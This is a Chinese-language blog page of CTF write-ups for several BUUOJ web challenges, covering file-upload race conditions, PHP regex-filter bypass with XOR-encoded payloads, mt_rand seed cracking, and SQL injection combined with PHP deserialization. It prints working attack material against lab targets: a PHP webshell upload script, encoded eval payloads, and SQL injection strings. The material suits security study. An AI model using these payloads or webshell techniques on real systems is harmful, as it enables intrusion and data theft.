<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content=""><meta name="keywords" content=""><meta name="author" content="vague huang"><meta name="copyright" content="vague huang"><title>Tlife</title><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.9.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.9.0"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  hexoVersion: '5.2.0'
} </script><meta name="generator" content="Hexo 5.2.0"></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="false"><div class="author-info"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">vague huang</div><div class="author-info__description text-center"></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">156</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">18</span></a></div></div></div><nav class="no-bg" id="nav"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Tlife</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/categories">Categories</a></span><span class="pull-right"></span></div><div id="site-info"><div id="site-title">Tlife</div><div id="site-sub-title"></div></div></nav><div id="content-outer"><div class="layout" id="content-inner"><div class="recent-post-item article-container"><a class="article-title" href="/2021/07/24/buu23/">buu23</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-07-24</time><div class="content"><h2 id="RoarCTF-2019-Simple-Upload"><a href="#RoarCTF-2019-Simple-Upload" class="headerlink" title="[RoarCTF 2019]Simple Upload"></a>[RoarCTF 2019]Simple Upload</h2><p>开头源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Home</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Think</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $uploadFile = $_FILES[<span class="string">&#x27;file&#x27;</span>] ;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (strstr(strtolower($uploadFile[<span class="string">&#x27;name&#x27;</span>]), <span class="string">&quot;.php&quot;</span>) ) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        $upload = <span class="keyword">new</span> \Think\Upload();<span class="comment">// 实例化上传类</span></span><br><span class="line">        $upload-&gt;maxSize  = <span class="number">4096</span> ;<span class="comment">// 设置附件上传大小</span></span><br><span class="line">        $upload-&gt;allowExts  = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>, <span class="string">&#x27;gif&#x27;</span>, <span class="string">&#x27;png&#x27;</span>, <span class="string">&#x27;jpeg&#x27;</span>);<span class="comment">// 设置附件上传类型</span></span><br><span class="line">        $upload-&gt;rootPath = <span class="string">&#x27;./Public/Uploads/&#x27;</span>;<span class="comment">// 设置附件上传目录</span></span><br><span class="line">        $upload-&gt;savePath = <span class="string">&#x27;&#x27;</span>;<span class="comment">// 设置附件上传子目录</span></span><br><span class="line">        $info = $upload-&gt;upload() ;</span><br><span class="line">        <span class="keyword">if</span>(!$info) &#123;<span class="comment">// 上传错误提示错误信息</span></span><br><span class="line">          <span class="keyword">$this</span>-&gt;error($upload-&gt;getError());</span><br><span class="line">          <span class="keyword">return</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;<span class="comment">// 上传成功 获取上传文件信息</span></span><br><span class="line">          $url = __ROOT__.substr($upload-&gt;rootPath,<span class="number">1</span>).$info[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;savepath&#x27;</span>].$info[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;savename&#x27;</span>] ;</span><br><span class="line">          <span class="keyword">echo</span> json_encode(<span class="keyword">array</span>(<span class="string">&quot;url&quot;</span>=&gt;$url,<span class="string">&quot;success&quot;</span>=&gt;<span class="number">1</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>尝试了一下其他后缀名上传，发现无法被解析成功，所以看到这个upload()函数，以及对应的防护机制，猜测可以使用条件竞争绕过，写先一下脚本</p>
<p>thinkphp默认上传路径为：<br>/home/index/upload<br>所以有</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://5ff85f06-6397-4b0b-9dc6-362da72c71bb.node4.buuoj.cn/index.php/home/index/upload&quot;</span></span><br><span class="line">s=requests.session()</span><br><span class="line">files=&#123;<span class="string">&#x27;file&#x27;</span>:(<span class="string">&quot;1.txt&quot;</span>,<span class="string">&quot;&quot;</span>)&#125;</span><br><span class="line">files1=&#123;<span class="string">&#x27;file&#x27;</span>:(<span class="string">&quot;1.php&quot;</span>,<span class="string">&quot;&lt;?php eval($_GET[&#x27;a&#x27;]); ?&gt;)&quot;</span>)&#125;</span><br><span class="line">r=s.post(url,files=files).text</span><br><span class="line">print(r)</span><br><span class="line">r=s.post(url,files=files1).text</span><br><span class="line">print(r)</span><br><span class="line">r=s.post(url,files=files).text</span><br><span class="line">print(r)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;url&quot;:&quot;\&#x2F;Public\&#x2F;Uploads\&#x2F;2021-07-24\&#x2F;60fbd50e4d0f4.txt&quot;,&quot;success&quot;:1&#125;</span><br><span class="line">&#123;&quot;url&quot;:&quot;\&#x2F;Public\&#x2F;Uploads\&#x2F;&quot;,&quot;success&quot;:1&#125;</span><br><span class="line">&#123;&quot;url&quot;:&quot;\&#x2F;Public\&#x2F;Uploads\&#x2F;2021-07-24\&#x2F;60fbd50e61127.txt&quot;,&quot;success&quot;:1&#125;</span><br></pre></td></tr></table></figure>

<p>接下来就是去爆破一下这个文件名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">60fbd50e61127</span><br><span class="line">60fbd50e4d0f4</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://5ff85f06-6397-4b0b-9dc6-362da72c71bb.node4.buuoj.cn/Public/Uploads/2021-07-24/&quot;</span></span><br><span class="line"><span class="comment"># files=&#123;&#x27;file&#x27;:(&quot;1.txt&quot;,&quot;&quot;)&#125;</span></span><br><span class="line"><span class="comment"># files1=&#123;&#x27;file[]&#x27;:(&quot;1.php&quot;,&quot;&lt;?php eval($_GET[&#x27;a&#x27;]); ?&gt;)&quot;)&#125;</span></span><br><span class="line"><span class="comment"># r=s.post(url,files=files).text</span></span><br><span class="line"><span class="comment"># print(r)</span></span><br><span class="line"><span class="comment"># r=s.post(url,files=files1).text</span></span><br><span class="line"><span class="comment"># print(r)</span></span><br><span class="line"><span class="comment"># r=s.post(url,files=files).text</span></span><br><span class="line"><span class="comment"># print(r)</span></span><br><span class="line">str=<span class="string">&#x27;0123456789abcdef&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> str:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> str:</span><br><span class="line">        <span class="keyword">for</span> f <span class="keyword">in</span> str:</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> str:</span><br><span class="line">                <span class="keyword">for</span> o <span class="keyword">in</span> str:</span><br><span class="line">                    url_fina=url+<span class="string">f&quot;60fbd50e<span class="subst">&#123;i&#125;</span><span class="subst">&#123;j&#125;</span><span class="subst">&#123;f&#125;</span><span class="subst">&#123;k&#125;</span><span class="subst">&#123;o&#125;</span>.php&quot;</span></span><br><span class="line">                    <span class="keyword">try</span>:</span><br><span class="line">                        r=requests.get(url,timeout=<span class="number">1</span>)</span><br><span class="line">                    <span class="keyword">except</span>:</span><br><span class="line">                        <span class="keyword">continue</span></span><br><span class="line">                    <span class="keyword">if</span> r.status_code!=<span class="number">404</span>:</span><br><span class="line">                        print(url_fina)</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>但是现在buu的防止太多请求太严了–一直跑不出来</p>
<h2 id="HarekazeCTF2019-Avatar-Uploader-1"><a href="#HarekazeCTF2019-Avatar-Uploader-1" class="headerlink" title="[HarekazeCTF2019]Avatar Uploader 1"></a>[HarekazeCTF2019]Avatar Uploader 1</h2><p>忘保存了，没了很难受，大概就是照一张256像素一下的图片，然后将图片内容改为这一行因为那两个解析函数的解析方式在这里不同</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210724182401.png" alt="img" style="zoom:67%;">

<h2 id="ISITDTU-2019-EasyPHP"><a href="#ISITDTU-2019-EasyPHP" class="headerlink" title="[ISITDTU 2019]EasyPHP"></a>[ISITDTU 2019]EasyPHP</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">$_ = @$_GET[<span class="string">&#x27;_&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> ( preg_match(<span class="string">&#x27;/[\x00- 0-9\&#x27;&quot;`$&amp;.,|[&#123;_defgops\x7F]+/i&#x27;</span>, $_) )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;rosé will not do it&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( strlen(count_chars(strtolower($_), <span class="number">0x3</span>)) &gt; <span class="number">0xd</span> )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;you are so close, omg&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>($_);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>正则进行匹配过滤，匹配00到空格()的字符，0到9的数字、<code>&quot;$&amp;.,|[&#123;_defgops</code>以及DEL（7f）字符。如果你提交的字符串出现上述字符，die。第二个if表示我们提交的字符串一共不能出现多于13种不同的字符<br>使用此网站可以进行正则匹配的调试<br><a target="_blank" rel="noopener" href="https://regex101.com/">https://regex101.com/</a><br>所以它允许出现的字符可以如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">!#%()*+-&#x2F;:;&lt;&#x3D;&gt;?@ABCHIJKLMNQRTUVWXYZ\]^abchijklmnqrtuvwxyz&#125;~</span><br></pre></td></tr></table></figure>

<p>我们后面的eval肯定是要执行函数的，所以我们可以fuzz一下哪些函数没被过滤，从而来看看有没有实现rce的可能,用php写个脚本</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$array=get_defined_functions();</span><br><span class="line"><span class="keyword">foreach</span>($array[<span class="string">&#x27;internal&#x27;</span>] <span class="keyword">as</span> $arr)&#123;</span><br><span class="line">	<span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[\x00- 0-9\&#x27;&quot;\`$&amp;.,|[&#123;_defgops\x7F]+/i&#x27;</span>,$arr))<span class="keyword">continue</span>;</span><br><span class="line">	<span class="keyword">if</span>(strlen(count_chars(strtolower($arr),<span class="number">0x3</span>))&gt;<span class="number">0xd</span>)<span class="keyword">continue</span>;</span><br><span class="line">	var_dump($arr.<span class="string">&#x27;&lt;br/&gt;&#x27;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是得到的函数却和读取文件啥的没有关系–，所以继续往下看看<br>其实以前也做过很多这种类似题特征是<br>1.过滤了很多字符<br>2.有些运算字符没有被过滤<br>那么这就意味着我们可以通过运算来取字符，比如说^运算然后去构造我们需要的字符<br>payloadtest:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">(%<span class="number">8</span>f%<span class="number">97</span>%<span class="number">8</span>f%<span class="number">96</span>%<span class="number">91</span>%<span class="number">99</span>%<span class="number">90</span>^%ff%ff%ff%ff%ff%ff%ff)();<span class="comment">//分号和括号是因为这个要放到eval里面执行，是必不可少的语法要求</span></span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210725220736.png" alt="image-20210725220736235" style="zoom:67%;">

<p>接下来看看这个配置里面有什么能用的信息不<br>首先disable_function中的函数有很多都被禁了，然后它可以访问的目录也只限制在/html目录下，那么根据以往的经验，大概是要scandir等函数看一下当前目录下的内容了<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210725221932.png" alt="img" style="zoom:67%;"><br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210725221933.png" alt="img" style="zoom:67%;"><br>我们构造一下语句然后去找一下字符</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">print_r(scandir(&#39;.&#39;));</span><br></pre></td></tr></table></figure>

<p>还是之前的那个脚本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import urllib.parse</span><br><span class="line">find &#x3D; [&#39;p&#39;,&#39;r&#39;,&#39;i&#39;,&#39;_&#39;,&#39;n&#39;,&#39;t&#39;,&#39;s&#39;,&#39;c&#39;,&#39;a&#39;,&#39;d&#39;,&#39;r&#39;,&#39;.&#39;]</span><br><span class="line">for i in range(0,256):</span><br><span class="line">    for j in range(0,256):</span><br><span class="line">        result&#x3D;chr(i^j)</span><br><span class="line">        if(result in find):</span><br><span class="line">            a&#x3D; i.to_bytes(1,byteorder&#x3D;&#39;little&#39;)</span><br><span class="line">            b&#x3D; j.to_bytes(1,byteorder&#x3D;&#39;little&#39;)</span><br><span class="line">            #print(a,b)</span><br><span class="line">            a&#x3D; urllib.parse.quote(a)</span><br><span class="line">            b&#x3D; urllib.parse.quote(b)</span><br><span class="line">            print(&quot;%s:%s^%s&quot;%(result,a,b))</span><br></pre></td></tr></table></figure>

<p>但是这样运算出来的字符我们随便选取就会大于十三个了，要绕过这个，我们就要想想看如何缩减？</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">((%8f%8d%96%91%8b%a0%8d)^(%ff%ff%ff%ff%ff%ff%ff))(((%8c%9c%9e%91%9b%96%8d)^(%ff%ff%ff%ff%ff%ff%ff))(%d1^%ff));</span><br></pre></td></tr></table></figure>

<p>其实运用一种套娃的思想即可，这些字符里面的字符肯定可以由其他字符再异或构成的，所以我们这里就将所有异或字符先列出，想在上面的代码进行改编一下，直接一步到位<br>但是我发现似乎不太行。还不如我直接取完再送进去对每个字符重新异或</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">result2 = [<span class="number">0x8b</span>, <span class="number">0x9b</span>, <span class="number">0xa0</span>, <span class="number">0x9c</span>, <span class="number">0x8f</span>, <span class="number">0x91</span>, <span class="number">0x9e</span>, <span class="number">0xd1</span>, <span class="number">0x96</span>, <span class="number">0x8d</span>, <span class="number">0x8c</span>]  <span class="comment"># Original chars,11 total</span></span><br><span class="line">result = [<span class="number">0x9b</span>, <span class="number">0xa0</span>, <span class="number">0x9c</span>, <span class="number">0x8f</span>, <span class="number">0x9e</span>, <span class="number">0xd1</span>, <span class="number">0x96</span>, <span class="number">0x8c</span>]  <span class="comment"># to be deleted</span></span><br><span class="line">temp = []</span><br><span class="line"><span class="keyword">for</span> d <span class="keyword">in</span> result2:</span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> result:</span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> result:</span><br><span class="line">            <span class="keyword">for</span> c <span class="keyword">in</span> result:</span><br><span class="line">                <span class="keyword">if</span> (a ^ b ^ c == d):</span><br><span class="line">                    <span class="keyword">if</span> a == b == c == d:</span><br><span class="line">                        <span class="keyword">continue</span></span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        print(<span class="string">&quot;a=0x%x,b=0x%x,c=0x%x,d=0x%x&quot;</span> % (a, b, c, d))</span><br><span class="line">                        <span class="keyword">if</span> d <span class="keyword">not</span> <span class="keyword">in</span> temp:</span><br><span class="line">                            temp.append(d)</span><br><span class="line">print(len(temp), temp)</span><br></pre></td></tr></table></figure>

<p>对结果进行整理一下，发现：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">((%9b%9c%9b%9b%9b%9b%9c)^(%9b%8f%9b%9c%9c%9b%8f)^(%8f%9e%96%96%8c%a0%9e)^(%ff%ff%ff%ff%ff%ff%ff))(((%9b%9b%9b%9b%9b%9b%9c)^(%9b%9b%9b%9c%a0%9b%8f)^(%8c%9c%9e%96%a0%96%9e)^(%ff%ff%ff%ff%ff%ff%ff))(%d1^%ff));</span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210726003819.png" alt="img" style="zoom:67%;">
拿到flag所在文件。最后构造一下，因为flag在最后一个位置，所以可以直接用end进行获取

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">((%8d%9c%97%a0%88%8d%97%8d%9c%a0%a0)^(%9a%97%9b%88%a0%9a%9b%9b%8d%9c%9a)^(%9b%9c%9c%a0%88%9b%9c%9c%9c%a0%a0)^(%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff))(((%a0%97%8d)^(%9a%9a%9b)^(%a0%9c%8d)^(%ff%ff%ff))(((%8d%a0%88%97%8d%9b%9c)^(%9a%9c%8d%9a%9b%9a%8d)^(%9b%a0%9b%9c%8d%97%9c)^(%ff%ff%ff%ff%ff%ff%ff))(%d1^%ff)));</span><br><span class="line"></span><br></pre></td></tr></table></figure>

</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/07/22/buu22/">buu22</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-07-22</time><div class="content"><h2 id="MRCTF2020-Ezaudit"><a href="#MRCTF2020-Ezaudit" class="headerlink" title="[MRCTF2020]Ezaudit"></a>[MRCTF2020]Ezaudit</h2><p>随手试了一下<a target="_blank" rel="noopener" href="http://www.zip==又有源码了,/">www.zip==又有源码了，</a></p>
<p>前面就是登陆啥啥啥的，看了一下关键是要有private_key，所以看了一下下面的代码，使用mt_rand构造的公钥和私钥，所以只要我们获得随机数种子就行了</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210720090352.png" alt="img" style="zoom:67%;">

<p>和buu14里面的题目一样的，不过最后要到login.html进行登录，密码可以用万能钥匙’or 1=1’1<br>这里有个大坑，以前没有注意过<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210720093849.png" alt="img" style="zoom:67%;"></p>
<p>这里要求php的版本是要在5.2.1到7.0.x之间的，不然出来的秘钥是不匹配的</p>
<h2 id="GXYCTF2019-StrongestMind"><a href="#GXYCTF2019-StrongestMind" class="headerlink" title="[GXYCTF2019]StrongestMind"></a>[GXYCTF2019]StrongestMind</h2><p>计算成功1000次看起来是要写个脚本<br>改天一定要学学算法，感觉自己写的代码都好冗长，可以去世了，测试是可以的，但是由于现在buu限制了，一下子发送太多请求直接500了，服惹<del>弄了时间间隔也没用，so</del>下一题了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url=<span class="string">&quot;http://e96f1fb4-3b45-487a-ada1-2465e38d9be2.node4.buuoj.cn/&quot;</span></span><br><span class="line">s=requests.session()</span><br><span class="line">r = s.post(url=url).text</span><br><span class="line">r1=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">10000</span>):</span><br><span class="line">    <span class="keyword">if</span> i!=<span class="number">0</span>:</span><br><span class="line">     r=r1</span><br><span class="line">    answer1=re.compile(<span class="string">r&#x27;&lt;br&gt;&lt;br&gt;\d&#123;8&#125;&#x27;</span>,re.S).findall(r)[<span class="number">0</span>].replace(<span class="string">&#x27;&lt;br&gt;&lt;br&gt;&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    answer2=re.compile(<span class="string">r&#x27;\d&#123;8&#125;&lt;br&gt;&lt;br&gt;&#x27;</span>,re.S).findall(r)[<span class="number">0</span>].replace(<span class="string">&#x27;&lt;br&gt;&lt;br&gt;&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    sign=re.compile(<span class="string">r&#x27; \W &#x27;</span>,re.S).findall(r)[<span class="number">0</span>].replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    answer1=float(answer1)</span><br><span class="line">    answer2=float(answer2)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;+&#x27;</span> == sign:</span><br><span class="line">        fina_answer=answer1+answer2</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        fina_answer = answer1-answer2</span><br><span class="line">    data=&#123;</span><br><span class="line">        <span class="string">&quot;answer&quot;</span>:fina_answer</span><br><span class="line">    &#125;</span><br><span class="line">    r1 = s.post(url=url, data=data).text</span><br><span class="line">    <span class="comment">#print(r1)</span></span><br><span class="line">    print(<span class="string">&#x27;*&#x27;</span>*<span class="number">25</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;bingo!&quot;</span> <span class="keyword">in</span> r1:</span><br><span class="line">        print(i)</span><br><span class="line">    time.sleep(<span class="number">0.5</span>)</span><br></pre></td></tr></table></figure>

<h2 id="安洵杯-2019-不是文件上传"><a href="#安洵杯-2019-不是文件上传" class="headerlink" title="[安洵杯 2019]不是文件上传"></a>[安洵杯 2019]不是文件上传</h2><h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><p>做题过程中遇到不熟悉的知识点写在前面比较好</p>
<h3 id="php—foreach理解"><a href="#php—foreach理解" class="headerlink" title="php—foreach理解"></a>php—foreach理解</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>];</span><br><span class="line"><span class="keyword">foreach</span>($arr <span class="keyword">as</span> &amp;$value) &#123;</span><br><span class="line">    $value = $value * <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// $arr is now [2, 4, 6, 8]</span></span><br><span class="line"><span class="keyword">unset</span>($value); <span class="comment">// 最后取消掉引用</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> ($arr <span class="keyword">as</span> $k =&gt; &amp;$v) &#123;</span><br><span class="line">    $v = $v * <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//$arr=2 4 6</span></span><br></pre></td></tr></table></figure>

<p>原题目有文件泄露所以直接上github下载一下源码<br>然后开始审计~：<br>在helper.php中看到一处序列化，其中这个my_ext是图片的大小，即宽度和高度<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210721182936.png" alt="img" style="zoom:67%;"></p>
<p>getfile()方法，存在check机制<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210721183219.png" alt="img" style="zoom:67%;"></p>
<p>严格的白名单检测机制，因为<br><strong>strrchr() 函数</strong><br>（在php中）查找字符在指定字符串中从右面开始的第一次出现的位置，<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210721183423.png" alt="img" style="zoom:67%;"><br>这里有个文件读取，但是path似乎被写死了，暂时还没找到利用点<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210721194904.png" alt="img" style="zoom:67%;"><br>继续看一下其他文件，在show.php中看到了显示文件的代码，对attr_temp的内容进行反序列化，前面对它是进行了序列化的<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210721195511.png" alt="img" style="zoom:67%;"></p>
<h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>题目给了反序列化，但是没看到一些有用的跳板，感觉是要结合数据库进行攻击，最后利用file_get_contents得到flag，但是感觉对于那些值可控有点茫然，所以决定传值跟一下<br>首先是数据库配置：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">create database pic_base</span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210721210801.jpg" alt="img" style="zoom:67%;">
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210721210800.png" alt="img" style="zoom:67%;">

<p>可以发现文件名是可控的并且最后是attr参与反序列化，注意到又包含了helper.php，所以感觉是可以进行config值的更改的<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210721210635.png" alt="img" style="zoom:67%;"></p>
<p>所以思路如下：</p>
<p><code>首先构造反序列化对config重新赋值，然后通过sql注入使本来应该title的序列化语句跑到attr字段，然后通过访问该图片，即可获得flag</code><br>构造反序列化语句</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">helper</span></span>&#123;</span><br><span class="line">	<span class="keyword">protected</span> $ifview=<span class="literal">True</span>;</span><br><span class="line">	<span class="keyword">protected</span> $config=<span class="string">&quot;/flag&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$a=<span class="keyword">new</span> helper();</span><br><span class="line"><span class="keyword">echo</span> bin2hex(serialize($a);</span><br></pre></td></tr></table></figure>

<p>然后由于这个是protected<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210722084236.png" alt="img"></p>
<p>并且题目中对*号做了处理，所以我们对其进行十六进制加密就行了<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210722084333.png" alt="img"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x4f3a363a2268656c706572223a323a7b733a393a22002a00696676696577223b623a313b733a393a22002a00636f6e666967223b733a353a222f666c6167223b7d</span><br></pre></td></tr></table></figure>

<p>然后构造sql注入语句,抓包改文件名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;0x4f3a363a2268656c706572223a323a7b733a393a22002a00696676696577223b623a313b733a393a22002a00636f6e666967223b733a353a222f666c6167223b7d&#39;)#</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">INSERT INTO images (&#96;title&#96;,&#96;filename&#96;,&#96;ext&#96;,&#96;path&#96;,&#96;attr&#96;) VALUES(&#39;12&#39;,&#39;534b340ce39e1079.jpg&#39;,&#39;jpg&#39;,&#39;pic&#x2F;534b340ce39e1079.jpg&#39;,&#39;a:2:&#123;s:5:&quot;width&quot;;i:969;s:6:&quot;height&quot;;i:335;&#125;&#39;)</span><br></pre></td></tr></table></figure>

<p>成功插入<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210722085557.png" alt="img" style="zoom:67%;"><br>获得flag<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210722085725.png" alt="img"></p>
<h2 id="SUCTF-2018-GetShell"><a href="#SUCTF-2018-GetShell" class="headerlink" title="[SUCTF 2018]GetShell"></a>[SUCTF 2018]GetShell</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>($contents=file_get_contents($_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]))&#123;</span><br><span class="line">    $data=substr($contents,<span class="number">5</span>);</span><br><span class="line">    <span class="keyword">foreach</span> ($black_char <span class="keyword">as</span> $b) &#123;</span><br><span class="line">        <span class="keyword">if</span> (stripos($data, $b) !== <span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;illegal char&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;     </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>看源码，他除了源码的前五位不检查，其他都会和黑名单比对，但是我们不知道过滤了啥，所以需要fuzz一下,顺便学习一下如何编写文件上传的脚本</p>
